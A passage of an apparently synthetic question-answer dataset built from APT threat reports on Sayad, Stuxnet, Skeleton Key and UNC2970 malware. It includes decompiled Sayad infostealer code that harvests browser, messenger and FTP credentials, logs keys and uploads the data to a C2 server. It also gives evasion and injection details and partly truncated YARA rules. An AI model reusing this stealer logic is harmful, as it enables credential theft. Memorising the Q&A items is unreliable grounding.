    "output": "The iOS malware found in Operation Pawn Storm is part of the advanced espionage malware deployed by the SEDNIT group. This malware is typically installed on already compromised systems and is similar to the next-stage SEDNIT malware found on Microsoft Windows systems. The malware includes two applications: XAgent (detected as IOS_XAGENT.A) and another using the name of a legitimate iOS game, MadCap (detected as IOS_XAGENT.B). Both applications are designed to steal personal data, record audio, take screenshots, and send this information to a remote command-and-control (C&C) server. The primary goal of these SEDNIT-related spyware applications is to gather sensitive information from high-profile targets, showcasing the sophisticated and targeted nature of the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: [User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\",7812\nThe malware authors left some debugging messages that indicate the different stages of the Sayad Client initialization. The code also handles and collects all uncaught exceptions thrown during the execution of the\nmalware by attaching to AppDomain.UnhandledException and Application.ThreadException events.\nIn the next step, the client loads the configuration discussed in a previous section and then proceeds to start up all data collection components, as shown in the snippet below.\nprivate static void modopt(CallConvStdcall) Main()\n{\nApplication.SetUnhandledExceptionMode(\nUnhandledExceptionMode.CatchException);\nAppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(\nProgram.TotalExceptionHandler);\nApplication.ThreadException += new ThreadExceptionEventHandler(\nProgram.TotalExceptionHandler);\ntry\n{\nbool flag3;\nClientExceptions = new List<ExceptionSerializeModel>();\n_uploadQuque = new UploadQueue(); string path = CommonPath.ClientPath() +\nPath.DirectorySeparatorChar + \"base.dll\";                 while (!File.Exists(path))\n{\nThread.Sleep(int.Parse(Resources.ShortSleepTime));\n}\nDebug.Write(\"Config loaded\"); string[] strArray = File.ReadAllLines(path);\nExecutableConfigInfo info2 = new ExecutableConfigInfo {\nBuildId = strArray[0].Trim(),\nPublicKey = strArray[1].Trim(),\nPostURL = strArray[2].Trim(),\nResourceURL = strArray[3].Trim(),                     screenShotCount = strArray[4].Trim(),                     screenShotInterval = strArray[5].Trim(),                     startupScreenShot = strArray[6].Trim()\n};\n_configInfo = info2;\ntry\n{\nif (!string.IsNullOrEmpty(_configInfo.PostURL))                    {\nUri uri = new Uri(_configInfo.PostURL);\n_hostAddress = uri.OriginalString.Replace(                             uri.AbsolutePath, \"\");\n}\n}\ncatch\n{\nreturn;\n}\nCryptionKeyInfo info3 = new CryptionKeyInfo {\nKeySize = int.Parse(Resources.RSAKeySize),\nPublicKey = _configInfo.PublicKey\n};\n_keyInfo = info3;\nDebug.Write(\"Config parsed\"); if (!string.IsNullOrEmpty(_hostAddress))\n{\nnew Wiper(new Http(), _hostAddress,\n_configInfo.BuildId).StartWiper();\nDebug.Write(string.Format(\"wiper {0}\", _hostAddress));\n} new StorageUploader(new Http(), _configInfo.PostURL,\n_configInfo.BuildId).StartUploader();\nDebug.Write(\"storage uploader\"); new Updater(new Http(),\n_hostAddress, _configInfo.BuildId).StartUpdater();\nDebug.Write(\"updater\"); int keyLogLimitSize = int.Parse(\nResources.KeyloggerLogLimitSize); new Thread(delegate {\nKeyLoggerProc(new Http(), keyLogLimitSize);\n}).Start();\nDebug.Write(\"keylogger\"); int screenshotCount = int.Parse(\n_configInfo.screenShotCount); int screenshotInterval = int.Parse(\n_configInfo.screenShotInterval);\nnew Thread(delegate {\nScreenShotProc(new Http(),                                    screenshotInterval, screenshotCount);\n}).Start();\nDebug.Write(\"Screenshot\");\nDebug.Write(_configInfo.ResourceURL); if (SQLiteFinder.FindSqlite(_configInfo.ResourceURL))                {\nDebug.Write(\"sqlite found & start collectiong data\");\nSerializeModel dataToSerialize = NewSerializerModel();                     dataToSerialize.MachineInfo =\nnew MachineInfo().GetMachineInfo();\nDebug.Write(\"Machine info collected\");\nList<IBrowser> list = new List<IBrowser> { new Chrome(), new Firefox(), new Opera()\n};\nforeach (IBrowser browser in list)\n{\ndataToSerialize.BrowsersInfo.Add(                             browser.GetBrowserInfo());\n}\nDebug.Write(\"browser ok\");\nList<IMessenger> list2 = new List<IMessenger> { new Pidgin(), new YahooMessenger(), new Gtalk()\n};\nforeach (IMessenger messenger in list2)\n{\ndataToSerialize.MessengersInfo.Add(                             messenger.GetMessengerInfo());\n}\nDebug.Write(\"messenger ok\");\nList<IVpn> list3 = new List<IVpn> { new Proxifier()\n};\nforeach (IVpn vpn in list3)\n{\ndataToSerialize.VpNsInfo.Add(vpn.GetClientInfo());\n}\nDebug.Write(\"vpn ok\");\nList<IFtpClient> list4 = new List<IFtpClient> { new FilezillaClient(), new Winscp()\n};\nforeach (IFtpClient client in list4)\n{\ndataToSerialize.FtpClientsInfo.Add(                             client.GetFtpClientInfo());\n}\nDebug.Write(\"ftp client ok\");\nList<IFtpServer> list5 = new List<IFtpServer> { new FilezillaServer()\n};\nforeach (IFtpServer server in list5)\n{\ndataToSerialize.FtpManagementsInfo.Add(                             server.GetFtpServerInfo());\n}\nDebug.Write(\"ftp server ok\");\nList<IRemoteClient> list6 = new List<IRemoteClient> { new Putty(), new RemoteDesktop()\n};\nforeach (IRemoteClient client2 in list6)\n{\ndataToSerialize.RemoteClientsInfo.Add(                             client2.GetRemoteClientsInfo());\n}\nDebug.Write(\"rdp ok\");\nList<IFileCollector> list7 = new List<IFileCollector> {\nnew Kerio()\n};\nforeach (IFileCollector collector in list7)\n{\ndataToSerialize.ExtraFiles.Add(collector.GetFile());\n}\nDebug.Write(\"kerio ok\"); string[] skypeDatabases = Skype.GetSkypeDatabases(); foreach (string str2 in skypeDatabases)\n{\nstring destFileName = Path.Combine(\nPath.GetTempPath(), Path.GetFileName(str2));\nFile.Copy(str2, destFileName); if (File.Exists(destFileName))\n{\nDirectoryInfo parent = new\nDirectoryInfo(str2).Parent;\nif ((parent != null) && File.Exists(destFileName))                            {\nExtraFileSerializeModel item =\nnew ExtraFileSerializeModel {\nName = Resources.SkypePathName,\nDescription = parent.Name,\nData = File.ReadAllBytes(destFileName)\n};\ndataToSerialize.ExtraFiles.Add(item);\n}\nFile.Delete(destFileName);\n}\n}\nDebug.Write(\"skype ok\"); byte[] bytetoEncrypt = ModelSerializer.SerializeAndCompress(                        dataToSerialize);\nDebug.Write(\"serialize data ok\"); byte[] buffer = EncryptBuffer(bytetoEncrypt, _keyInfo);\nHttp http = new Http(); if (!http.UploadBuffer(buffer, _configInfo.BuildId,\n_configInfo.PostURL))\n{\nFile.WriteAllBytes(\nPath.Combine(CommonPath.ClientStorage(),\nPath.GetRandomFileName()), buffer);\n}                } string startupKeyName = Resources.StartupKeyName; if (!Startup.CheckStartup(startupKeyName))                {\nStartup.SetStartup(startupKeyName,\nApplication.ExecutablePath);\n}\ngoto Label_07DD;\nLabel_07D4:\nThread.Sleep(-1);\nLabel_07DD:\nflag3 = true; goto Label_07D4;\n}\ncatch (Exception exception)            {\nAddExceptionToExceptionList(exception);\n}\n}\nThe Sayad Client uses a very trivial method for uploading the encrypted user and host data to the malicious server. Here is the UploadBuffer method that uses .NET WebClient class to upload the data.\nBoth the Binder and the Sayad Client have been built with debugging information which reveals some details about the source code locations for these two .NET projects.\nf:\\Projects\\C#\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb\nF:\\Projects\\C#\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb\nBig Headline: Network Activity\nCommunication with the C2 server is limited to transferring collected data from the user and the host to the C2 server. The stolen data being uploaded to the malicious server is encrypted first using a RSA public key which is stored in the malware configuration file. The Sayad Client (DiagnosticsService.dll) implements an HTTP client that uploads the encrypted data to the malicious Web server with host name \"0o0o0o0o0[dot]com\" and IP address 107.6.182.179. The Binder component doesn't implement any communication features. The following is a short segment from Vinsula network activity report.\n+ WEXTRACT.exe [Process Id: 3508]\n+ ~8f60957b3689075fa093b047242c0255.exe [Process Id: 2544]\n+ rundll32.exe [Process Id: 2596] [Parent Id: 2544]\nCommand Line: rundll32.exe \"DiagnosticsService.dll\",78121\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1325 <==> 107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1326 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1326  ==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1325  ==> 107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1326 <==  107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1325 <==  107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1327 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1327  ==> 107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1327 <==  107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1328 <==> 107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1329 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1328  ==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1329  ==> 107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1328 <==  107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1329 <==  107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1330 <==> 107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1331 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1330  ==> 107.6.182.179:80\nAccording to the (<http://www.ipligence.com/geolocation>)http://www.ipligence.com/geolocation service, the malicious Web server is located in the Netherlands.\nBelow is the WHOIS information for the malicious host 0o0o0o0o0[dot]com (IP 107.6.182.179). The domain was registered on June 30, 2014. Interestingly, the registrant, admin and tech email addresses are domain@microsofts.com. One wonders if the registrar, OnlineNIC, Inc, is verifying whether or not these are real email addresses.\nBig Headline: YARA detection rule\nBased on the details that have been identified, we can create two simple YARA rules for detection of the Sayad Binder and Sayad Client. Hopefully this will help other malware researchers and security companies.\n{\nmeta:\ndescription = \"Sayad Infostealer Binder\"\nin_the_wild = true\nstrings:\n$pdbstr =\n\"\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Binder\\\\obj\\\\Debug\\\\Binder.pdb\"\n$delphinativestr = \"DelphiNative.dll\" nocase\n$sqlite3str = \"sqlite3.dll\" nocase\n$winexecstr = \"WinExec\"\n$sayadconfig = \"base.dll\" wide\ncondition:\nall of them\n}\nrule Vinsula_Sayad_Client : infostealer\n{\nmeta:\ncopyright = \"Vinsula, Inc\"   description = \"Sayad Infostealer Client\"\nactor = \"Sayad Client\"   in_the_wild = true\nstrings:\n$pdbstr =\ncondition:\nall of them\n}\n\nQ: How does the Sayad malware handle exceptions during its execution, and why is this significant for its robustness?",
    "output": "A: The Sayad malware handles exceptions by attaching to AppDomain.UnhandledException and Application.ThreadException events. This means that it catches all uncaught exceptions thrown during the execution of the malware. By doing so, the malware ensures that it continues to run even if errors occur, making it more robust and harder to detect through crashes or unexpected behavior. This approach helps the malware maintain persistence and continue its malicious activities without interruption.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the implications of the Red October campaign on the future of cyber conflict in the oil and gas industry? How does the sophistication of Red October indicate a shift in cyber warfare tactics?",
    "output": "The Red October campaign, which targeted both diplomatic entities and the oil and gas industry, showcases a high level of sophistication in terms of infrastructure and methods used. This sophistication suggests a significant evolution in cyber conflict tactics. The oil and gas industry can expect to see more advanced and persistent threats, with attacks becoming increasingly complex and destructive. The modular nature of malware used in such campaigns blurs the line between espionage and sabotage, making it crucial for the industry to enhance its defenses against multi-faceted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: By phone\nFew days later, we were contacted again, this time by phone. The caller pretended to be an official in one of the effected countries mentioned in the report. Similarly, he asked for further information about the identity of the attacker. We asked the caller to send his request via email. Corroborating the provided contact information, we learned that this was also a fake.\nIn both cases, we did not send any information to the attackers. However, we used the new leads to deepen the investigation.\nBelow is the email we received:\n\nAnswer this question based on the above context: How did the authors of the Clearsky Operation DustySky report handle requests for additional information from suspected attackers, and what steps did they take to verify the authenticity of these requests?",
    "output": "The authors of the Clearsky Operation DustySky report handled requests for additional information by asking the requesters to send their requests via email. They then corroborated the provided contact information to verify its authenticity. In both instances where they were contacted\u2014once by email and once by phone\u2014they discovered that the requests were fake. Despite not providing any information to the attackers, they utilized these new leads to deepen their investigation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nThere have been many media reports in recent years about cyber attacks on governments and a variety of private sector companies. The rather ambiguous term 'Advanced Persistent Threat'3 ('APT') is widely used to describe any attack that appears to have compromised computers in these companies or organisations, regardless of the source or purpose of the attack. We prefer simply to call them 'targeted attacks' and leave marketing terms to one side. This paper is not concerned with the technical aspects of targeted attacks, it seeks instead to inform readers about the full scope and nature of these attacks, the reasons why they are launched and the people and policies behind their design and execution.\nMany reports of attacks inevitably end by asking 'who did it?' But the answer is rarely straightforward. Western Governments usually allege the attacks come from 'Asia' or the 'Far East', rather than risk offending the Chinese government. Large corporations are similarly vague in their descriptions of these events, for fear of harming lucrative business arrangements. Security 'experts' always caution that IP addresses can be used as hop points through which attackers disguise their true origins, so perhaps this could be a case of other countries trying to make it look as if China was the source. While this is true, if something looks, walks and quacks like a duck, it is almost always a duck.\nWe will not be so coy. This paper will look directly at the most prolific sponsor of computer network exploitation attacks: China. We know other countries have implemented similar programs for attacking computer networks and have seen many examples of these in our work over the last few years, but our focus here is China.\nWe will examine various aspects of these attacks, including the nature of the information targeted and the types of organisations threatened. We will consider the effort involved in planning, executing and managing these attacks; and assess the information products they generate, in order to understand the scale of human involvement and the government policies that sponsor information theft via targeted attacks. With all this in mind we will then postulate on where the stolen information goes and how it may be used.\n3 Advanced Persistent Threat has recently become a catch all term for targeted attacks against computer networks and is often used to describe the malware. In fact, the term was first coined by the United States Air Force in 2006, specifically to refer to China \u2013 without actually saying China. 'Advanced' because the attackers could use a variety of attacks to get access to a network and could raise their game to use zero day vulnerabilities if necessary; 'Persistent' because the attacks would not stop until the attacker had achieved their objectives; and 'Threat' because this attack was not automated like a botnet, but was conducted by humans who adapt and evolve their methods to evade defences.\nRead the text above and answer this question: In the context of the APT report 'Crouching_tiger_hidden_dragon', what are the key characteristics that distinguish an 'Advanced Persistent Threat' (APT) from other types of cyber attacks? Why are these characteristics significant in understanding the nature and scope of targeted attacks?",
    "output": "An 'Advanced Persistent Threat' (APT) is characterized by several key features that set it apart from other types of cyber attacks. Firstly, it is 'Advanced' because the attackers can employ a variety of sophisticated techniques to gain access to a network, including the use of zero-day vulnerabilities if necessary. Secondly, it is 'Persistent' because the attacks continue until the attacker achieves their objectives, indicating a high level of determination and resources. Lastly, it is a 'Threat' because it is conducted by humans who adapt and evolve their methods to evade defenses, unlike automated attacks such as those carried out by botnets. These characteristics are significant because they highlight the complexity and resourcefulness of the attackers, suggesting a well-funded and organized operation, often backed by state actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nSyria's opposition has faced persistent targeting by Pro-Government Electronic Actors (PGEAs) throughout the Syrian civil war. A pro-government group calling itself the Syrian Electronic Army has gained visibility in recent months with high profile attacks against . Meanwhile, Syrian activists continue to be targeted with online attacks apparently for the purposes of accessing their private communications and stealing their secrets.\nThroughout 2012, attacks against the Syrian opposition were documented in an of by Morgan Marquis-Boire and Eva Galperin with the help of the . 1 Many others have also on Syrian malware, from Telecomix to a range of security companies. Meanwhile, the Syrian opposition, and several groups working closely with it, such as , have been active in attempting to identify potential threats and warn users.\nResearchers have identified a common theme among the attacks against the Syrian opposition: sophisticated social engineering that is grounded in an awareness of the needs, interests, and weaknesses of the opposition. Attacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files, or exploit fears of hacking and surveillance with fake security tools. Attacks are often transmitted to potential victims from the accounts of people with whom they are familiar.\nThe two attacks that are described in this blogpost follow this theme. One is a malicious installer of the circumvention tool Freegate. The other is an e-mail attachment calling for jihad against Hezbollah and the Assad regime or promising interesting regional news.\nQuestion: How does the Syrian Electronic Army leverage social engineering techniques to target the Syrian opposition, and what specific methods have they employed to exploit the needs, interests, and weaknesses of their targets?",
    "output": "Answer: The Syrian Electronic Army employs sophisticated social engineering techniques that are tailored to the needs, interests, and weaknesses of the Syrian opposition. These techniques often involve playing on the curiosity or ideology of the targets to encourage them to enter passwords or click on enticing files. Additionally, they exploit fears of hacking and surveillance by using fake security tools. Attacks are frequently transmitted through the accounts of familiar individuals, which increases the likelihood of the targets falling for the deception. Specific methods include distributing malicious installers of circumvention tools like Freegate and sending email attachments that call for jihad against Hezbollah and the Assad regime or promise interesting regional news.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Bypassing Behavior Blocking When Loading DLLs\nWhenever Stuxnet needs to load a DLL, including itself, it uses a special method designed to bypass behavior-blocking and host intrusion-protection based technologies that monitor LoadLibrary calls. Stuxnet calls Load-Library with a specially crafted file name that does not exist on disk and normally causes LoadLibrary to fail. However, W32.Stuxnet has hooked Ntdll.dll to monitor for requests to load specially crafted file names. These specially crafted filenames are mapped to another location instead\u2014a location specified by W32.Stuxnet. That location is generally an area in memory where a .dll file has been decrypted and stored by the threat previously. The filenames used have the pattern of KERNEL32.DLL.ASLR.[HEXADECIMAL] or SHELL32.DLL.ASLR. [HEXADECIMAL], where the variable [HEXADECIMAL]is a hexadecimal value.\nThe functions hooked for this purpose in Ntdll.dll are:\n\u2022 ZwMapViewOfSection\n\u2022 ZwCreateSection\n\u2022 ZwOpenFile\n\u2022 ZwCloseFile\n\u2022 ZwQueryAttributesFile\n\u2022 ZwQuerySection\nOnce a .dll file has been loaded via the method shown above, GetProcAddress is used to find the address of a specific export from the .dll file and that export is called, handing control to that new .dll file.\nMedium Headline: Injection Technique\nWhenever an export is called, Stuxnet typically injects the entire DLL into another process and then just calls the particular export. Stuxnet can inject into an existing or newly created arbitrary process or a preselected trusted process. When injecting into a trusted process, Stuxnet may keep the injected code in the trusted process or instruct the trusted process to inject the code into another currently running process.\nThe trusted process consists of a set of default Windows processes and a variety of security products. The currently running processes are enumerated for the following:\n\u2022 Kaspersky KAV (avp.exe)\n\u2022 Mcafee (Mcshield.exe)\n\u2022 AntiVir (avguard.exe)\n\u2022 BitDefender (bdagent.exe)\n\u2022 Etrust (UmxCfg.exe)\n\u2022 F-Secure (fsdfwd.exe)\n\u2022 Symantec (rtvscan.exe)\n\u2022 Symantec Common Client (ccSvcHst.exe)\n\u2022 Eset NOD32 (ekrn.exe)\n\u2022 Trend Pc-Cillin (tmpproxy.exe)\nIn addition, the registry is searched for indicators that the following programs are installed:\n\u2022 KAV v6 to v9\n\u2022 McAfee\n\u2022 Trend PcCillin\nIf one of the above security product processes are detected, version information of the main image is extracted. Based on the version number, the target process of injection will be determined or the injection process will fail if the threat considers the security product non-bypassable.\nThe potential target processes for the injection are as follows:\n\u2022 Lsass.exe\n\u2022 Winlogon.exe\n\u2022 Svchost.exe\n\u2022 The installed security product process\nTable 5 describes which process is used for injection depending on which security products are installed. In addition, Stuxnet will determine if it needs to use one of the two currently undisclosed privilege escalation vulnerabilities before injecting. Then, Stuxnet executes the target process in suspended mode.\nA template PE file is extracted from itself and a new section called .verif is created. The section is made large enough so that the entry point address of the target process falls within the .verif section. At that address in the template PE file, Stuxnet places a jump to the actual desired entry point of the injected code. These bytes are then written to the target process and ResumeThread is called allowing the process to execute and call the injected code.\nThis technique may bypass security products that employ behavior-blocking.\nIn addition to creating the new section and patching the entry point, the .stub section of the wrapper .dll file (that contains the main .dll file and configuration data) is mapped to the memory of the new process by means of shared sections. So the new\nprocess has access to the original .stub section. When the newly injected process is resumed, the injected code unpacks the .dll file from the mapped .stub section and calls the desired export.\nInstead of executing the export directly, the injected code can also be instructed to inject into another arbitrary process instead and within that secondary process execute the desired export.\nMedium Headline: Configuration Data Block\nThe configuration data block contains all the values used to control how Stuxnet will act on a compromised computer. Example fields in the configuration data can be seen in the Appendix.\nWhen a new version of Stuxnet is created (using the main DLL plus the 90h-byte data block plus the configuration data), the configuration data is updated, and also a computer description block is appended to the block (encoded with a NOT XOR 0xFF). The computer description block contains information such as computer name, domain name, OS version, and infected S7P paths. Thus, the configuration data block can grow pretty big, larger than the initial 744 bytes.\nThe following is an example of the computer description block :\n5.1 - 1/1/0 - 2 - 2010/09/22-15:15:47 127.0.0.1, [COMPUTER NAME] [DOMAIN NAME] [c:\\a\\1. zip:\\proj.s7p]\nThe following describes each field:\n5.1 - Major OS Version and Minor OS Version\n1/1/0 \u2013 Flags used by Stuxnet\n2 \u2013 Flag specifying if the computer is part of a workgroup or domain\n2010/09/22-15:15:47 \u2013 The time of infection.\n127.0.0.1 \u2013 Up to IP addresses of the compromised computer (not in the June 2009 version).\n[COMPUTER NAME] \u2013 The computer name.\n[DOMAIN NAME] \u2013 The domain or workgroup name.\n[c:\\a\\1.zip:\\proj.s7p] \u2013 The file name of infected project file.\n\nQuestion: Describe the injection technique used by Stuxnet to execute its code within trusted processes. What are the potential target processes and how does Stuxnet determine which process to inject into?\n\nAnswer:",
    "output": "Stuxnet uses a complex injection technique to execute its code within trusted processes. It can inject into an existing or newly created arbitrary process or a preselected trusted process. The trusted processes include a set of default Windows processes and various security products such as Kaspersky KAV, McAfee, AntiVir, BitDefender, Etrust, F-Secure, Symantec, Eset NOD32, and Trend Pc-Cillin. Stuxnet enumerates currently running processes and searches the registry for indicators of installed security products. Based on the version information of the main image, Stuxnet determines the target process for injection, which could be lsass.exe, winlogon.exe, svchost.exe, or the installed security product process. If Stuxnet considers the security product non-bypassable, the injection process fails. Before injecting, Stuxnet may use one of two undisclosed privilege escalation vulnerabilities. It then executes the target process in suspended mode, creates a new section called .verif in a template PE file, and places a jump to the desired entry point of the injected code. The .stub section of the wrapper .dll file is mapped to the memory of the new process, allowing it to access the original .stub section. When the newly injected process is resumed, it unpacks the .dll file from the mapped .stub section and calls the desired export.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Contributor: Nikolas Tsapkis\nOn January 12, 2015, Dell Secureworks blogged about a tool (Trojan.Skelky) that allows attackers to \"use a password of their choosing to authenticate as any user.\u2020The Skelky (from skeleton key) tool is deployed when an attacker gains access to a victim's network; the attackers may also utilize other tools and elements in their attack.\nSymantec has analyzed Trojan.Skelky and found that it may be linked to the Backdoor.Winnti malware family. The attackers behind the Trojan.Skelky campaign appear to have been using the malware in conjunction with this back door threat. It's unclear if the malware family Backdoor.Winnti is used by one attack group or many groups.\nDuring our research, we also found that Trojan.Skelky has been active over the past two years. Within this timeframe, we have seen new variants and a consistent hashed password value.\n\nHow does the Trojan.Skelky tool facilitate unauthorized access within a compromised network, and what is its connection to the Backdoor.Winnti malware family? Additionally, discuss the implications of the consistent hashed password value observed in different variants of Trojan.Skelky.",
    "output": "The Trojan.Skelky tool allows attackers to use a password of their choosing to authenticate as any user within a compromised network. This capability effectively acts as a 'skeleton key,' providing broad access to various accounts and systems. Symantec's analysis suggests that Trojan.Skelky is linked to the Backdoor.Winnti malware family, indicating that these tools may be part of a coordinated attack strategy. The consistent hashed password value observed across different variants of Trojan.Skelky over a two-year period suggests that the attackers have maintained a specific methodology for authentication, possibly to ensure persistent access or to simplify the management of their operations. This consistency could also imply that the same group or closely related groups are responsible for deploying these variants.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Establish Foothold\nIn multiple investigations, Mandiant has observed UNC2970 deploy PLANKWALK to establish footholds within environments. PLANKWALK is a backdoor written in C++ that communicates over HTTP and utilizes multiple layers of DLL sideloading to execute an encrypted payload. PLANKWALK is initially executed through a launcher that will import and execute a second stage launcher expected to be on disk.\nObserved First Stage Launcher names:\ndestextapi.dll\nmanextapi.dll\npathextapi.dll\npreextapi.dll\nWbemcomn.dll\nOnce loaded and executed, the secondary launcher will attempt to decrypt and execute an encrypted PLANKWALK sample on disk that matches the following pattern:\nC:\\ProgramData\\Microsoft\\Vault\\cache<three numerical digits>.db\nOnce executed, PLANKWALK will decrypt an on-host encrypted configuration file that contains the C2 for the backdoor. The C2 for PLANKWALK has largely been co-opted by legitimate WordPress sites.\nFollowing the deployment of PLANKWALK, Mandiant observed UNC2970 leverage a wide variety of additional tooling, including Microsoft InTune to deploy a shellcode downloader.\nMedium Headline: TOUCHSHIFT\nTOUCHSHIFT is a malicious dropper that masquerades as mscoree.dll or netplwix.dll . TOUCHSHIFT is typically created in the same directory and simultaneously as a legitimate copy of a Windows binary. TOUCHSHIFT leverages DLL Search Order Hijacking to use the legitimate file to load and execute itself. TOUCHSHIFT has been observed containing one to two various payloads which it executes in-memory. Payloads that have been seen include TOUCHSHOT, TOUCHKEY, HOOKSHOT, TOUCHMOVE, and SIDESHOW.\nTo appear legitimate, the file uses over 100 exports that match common system export names. However, the majority all point to the same empty function. The malicious code has been seen located in exports LockClrVersion or UsersRunDllW in different instances.\nWhen TOUCHSHIFT contains a second payload, it takes a single character command line option as its first argument to determine which of the two payloads to execute.\nTo unpack its payload(s), TOUCHSHIFT generates a decryption key by XOR encoding its second argument and the first 16 characters of the legitimate executable's file name.\nFor example, in one instance Mandiant observed the arguments -CortanaUIFilter , XOR encoded with the hardcoded key 009WAYHb90687PXkS ,and printfilterpipel ,which was XOR encoded with the hardcoded key .sV%58&.lypQ[$= and was loaded by the file printfilterpipelinesvc.exe . In another instance, the argument used was --forkavlauncher and the loading file was C:\\windows\\Branding\\Netplwiz.exe .\nOnce the code is unpacked, it is then loaded into a memory location created by a call to VirtualAlloc and executed from there.\nOnce the payload(s) has/have been executed, the main portion of TOUCHSHIFT will sleep for a period of time allowing the payload(s) to continue executing.\nMedium Headline: TOUCHSHOT\ntakes screenshots of the system on which it is running and saves them to a file to be retrieved by the threat actor at a later time. TOUCHSHOT is configured to take a screenshot every three seconds, and then uses ZLIB to compress the images. The compressed data is then appended to a file that it creates and continues appending new screenshots to this file until the file reaches five megabytes in size, at which point it will create a new file with the same naming convention. TOUCHSHOT was seen embedded in the same instance of TOUCHSHIFT as TOUCHKEY (discussed later in the post).\nTOUCHSHOT will create a file in the C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\ directory, and will name the file ~DM{####}P.dat , where the four numbers are pseudo-randomly generated. Once TOUCHSHOT has generated the file name, it attempts to create a handle to the file. If the return value indicates that the file does not exist, it will then create the file. This check is performed as part of a loop that continues until a new file needs to be created. After each iteration of the loop, TOUCHSHOT will then take a screenshot, which is appended to the staging file.\nMedium Headline: TOUCHKEY\nis a keylogger that captures keystrokes and clipboard data, both of which are encoded with a single-byte XOR and saved to a file. As with TOUCHSHOT, these files need to be acquired by the threat actor through additional means.\nTOUCHKEY creates two files in the C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\ directory. The file name Normal.dost is used for storing the captured keystrokes, while the file name Normal.docb is used for the clipboard data. The full paths are then passed into their own thread, where the keystrokes or clipboard data will be captured and appended to their respective files.\nIn one of the created threads, TOUCHKEY will open the clipboard and grab the data that is stored within it. In the other thread, TOUCHKEY will set a hook into the keyboard, and record any keys that are pressed.\nMedium Headline: TOUCHMOVE\nTOUCHMOVE is a loader that decrypts a configuration file and a payload, both of which must be on disk, and then executes the payload. TOUCHMOVE generates an RC6 key to decrypt the two files by querying the system's BIOS date, version, manufacturer, and product name. Once decrypted, the results are XOR encoded with a hardcoded key. If the generated RC6 key is incorrect, the configuration and payload files will not successfully decrypt, indicating that UNC2970 compiles instances of TOUCHMOVE after having already conducted reconnaissance on the target victim system. Once the RC6 key is successfully generated, a handle is created to the configuration file, and the decryption process is conducted. If the configuration file is successfully decrypted, the payload's full path is located within it, and the same decryption process then occurs on the payload. Following this, the payload is executed.\nMedium Headline: SIDESHOW\nSIDESHOW is a backdoor written in C/C++ that communicates via HTTP POST requests with its C2 server. The backdoor is multi-threaded, uses RC6 encryption, and supports at least 49 commands, which can be seen in Table 1. Capabilities include arbitrary command execution (WMI capable); payload execution via process injection; service, registry, scheduled task, and firewall manipulation; querying and updating Domain Controller settings; creating password protected ZIP files; and more. SIDESHOW does not explicitly establish persistence; however, based on the multitude of supported commands it may be commanded to establish persistence.\nSIDESHOW derives a system-specific RC6 key using the same registry values as TOUCHMOVE and uses the generated key to decrypt the same configuration file from disk that TOUCHMOVE decrypted. The decrypted configuration file contains a list of C2 URLs to which SIDESHOW communicates using HTTP POST requests. SIDESHOW iterates this C2 URL list and attempts to authenticate to each C2 URL until it is successful. Once successful, SIDESHOW enters a state of command processing and sends additional HTTP POST requests to retrieve commands. SIDESHOW attempts to use the system's default HTTP User-Agent string during C2 communications; however, if not available it uses the hard-coded HTTP User-Agent string:\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69\nWhen communicating to its C2 server via HTTP POST requests, SIDESHOW forms a URI parameter string consisting of a mix of randomly selected and hard-coded URI parameters.\nAuthentication requests use the following URI parameter string format:\n1<param_1>=<hex_seed>&<param_2>=pAJ9dk4OVq85jxKWoNfw1AG2C&<param_3>=<16_random_hex_chars>\nThe first URI parameter value comes from SIDESHOW's configuration and is used to seed the random function.\nThe second URI parameter value, pAJ9dk4OVq85jxKWoNfw1AG2C , is hardcoded and likely an authentication credential.\nThe third URI parameter value, <16_random_hex_chars> , is a session identifier ( <session_id> ) used for future communications and consists of two subcomponents:\n1. <8_random_hex_based_on_seed>\n2. <8_random_hex_based_on_tickcount>\nThe first URI parameter's value, <hex_seed> , is used as a random seed value to derive the first eight hexadecimal characters ( <8_random_hex_based_on_seed> ), whereas the last eight hexadecimal characters ( 